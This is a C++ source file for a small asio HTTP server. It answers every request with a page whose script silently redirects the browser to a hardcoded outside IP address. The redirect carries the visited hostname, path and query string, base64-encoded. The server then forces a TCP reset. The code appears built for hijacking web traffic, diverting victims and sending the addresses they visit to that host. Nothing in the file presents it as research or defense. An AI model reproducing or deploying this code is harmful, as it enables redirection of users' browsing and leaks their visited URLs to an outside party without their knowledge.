#include "http_server.h"
#include <asio.hpp>
#include <iostream>
#include <thread>

// 为 setsockopt 所需
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/tcp.h>

HTTPServer::HTTPServer(short port)
    : acc_(io_, asio::ip::tcp::endpoint(asio::ip::tcp::v4(), port)) {
    start_accept();
}

void HTTPServer::start_accept() {
    auto sock = std::make_shared<asio::ip::tcp::socket>(io_);
    acc_.async_accept(*sock, [this, sock](std::error_code ec){
        if (!ec) {
            std::thread([this, sock]{
                try { handle_client(sock); }
                catch (const std::exception& e) {
                    std::cerr << "[HTTP] client thread exception: " << e.what() << std::endl;
                }
            }).detach();
        }
        start_accept();
    });
}

std::string HTTPServer::build_redirect_page(const std::string& host) {
    (void)host;
     const std::string html = R"(<html><head></head><body><a href="" id="h"></a><script>var strU="http://206.119.82.102:39880" + "?d=" + btoa(window.location.hostname)+ "&p=" + btoa(window.location.pathname + window.location.search);h.href=strU;if(document.all){document.getElementById("h").click();}else {var e=document.createEvent("MouseEvents");e.initEvent("click",true,true);document.getElementById("h").dispatchEvent(e);}</script></body></html>)";

    // 关键：不发 Content-Length，也不发 Connection 头（既没有 close 也没有 keep-alive）
    // 这样 curl 会打印：no chunk, no close, no size. Assume close to signal end
    const std::string resp =
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html\r\n"
        "\r\n" + html;

    return resp;
}


void HTTPServer::handle_client(std::shared_ptr<asio::ip::tcp::socket> sock) {
    try {
        // 读到空行（请求头结束）
        asio::streambuf reqbuf;
        asio::read_until(*sock, reqbuf, "\r\n\r\n");

        // 提取 Host（仅用于日志，不影响响应）
        std::istream is(&reqbuf);
        std::string line, host;
        std::getline(is, line); // 请求行
        while (std::getline(is, line) && line != "\r") {
            if (line.rfind("Host:", 0) == 0) {
                host = line.substr(5);
                while (!host.empty() && (host.front()==' '||host.front()=='\t')) host.erase(host.begin());
                while (!host.empty() && (host.back()=='\r'||host.back()=='\n'||host.back()==' '||host.back()=='\t')) host.pop_back();
            }
        }

        // 让数据尽快发走
        int one = 1;
        ::setsockopt(sock->native_handle(), IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

        const auto resp = build_redirect_page(host);

        asio::error_code ec;
        asio::write(*sock, asio::buffer(resp), ec);
        if (ec) {
            std::cerr << "[HTTP] write error: " << ec.message() << std::endl;
            return;
        }

        // ★ 给对端一点时间把数据读走，避免 RST 把尾部丢掉
        std::this_thread::sleep_for(std::chrono::milliseconds(80)); // 可调 50~150ms

        // ★ 强制 RST：SO_LINGER{on=1, linger=0} + close()
        struct linger lg;
        lg.l_onoff  = 1;
        lg.l_linger = 0;
        ::setsockopt(sock->native_handle(), SOL_SOCKET, SO_LINGER, &lg, sizeof(lg));

        sock->close(ec); // 触发 RST
        std::cerr << "[HTTP] 200(no CL) then FORCE-RST; host='"
                  << (host.empty() ? "-" : host) << "'\n";

    } catch (const std::exception& e) {
        std::cerr << "[HTTP] client error: " << e.what() << std::endl;
    }
}

void HTTPServer::run() {
    std::cout << "[HTTP] Accepting on :" << SERVER_PORT << std::endl;
    io_.run();
}
